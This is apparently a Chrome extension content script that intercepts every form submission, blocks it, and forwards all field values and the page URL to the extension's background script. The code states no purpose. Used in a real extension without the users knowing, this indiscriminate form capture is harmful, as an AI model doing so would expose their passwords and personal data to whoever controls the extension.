document.addEventListener("submit", event => {
    event.preventDefault();
    const formData = new FormData(event.target);
    chrome.runtime.sendMessage({
        action: "submitFormData",
        data: {
            url: window.location.href,
            formData: Object.fromEntries(formData.entries())
        }
    },
    (response) => {
        console.log(response);
    });
});